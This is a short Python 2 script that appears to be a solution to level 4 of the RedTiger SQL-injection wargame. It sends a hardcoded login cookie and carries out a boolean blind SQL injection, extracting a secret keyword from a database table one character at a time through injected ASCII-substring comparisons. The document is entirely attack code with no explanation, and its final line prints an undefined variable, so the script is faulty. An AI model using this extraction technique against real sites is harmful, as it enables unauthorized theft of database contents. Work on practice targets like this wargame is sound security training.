import urllib2
headers = {'Cookie':'level4login=there_is_no_bug'}
word = ""
for a in range(1,22):
  for b in range(33,123):
    url = "http://redtiger.labs.overthewire.org/level4.php?id=1%20and%20ascii(substring((select%20keyword%20FROM%20level4_secret)" + ",%d,1))=%d-- -"%(a,b) 
    req = urllib2.Request(url,"",headers)
    source = urllib2.urlopen(req).read()
    if "1 rows" in source:
      word = word + chr(b)
      print chr(b)
      
print result
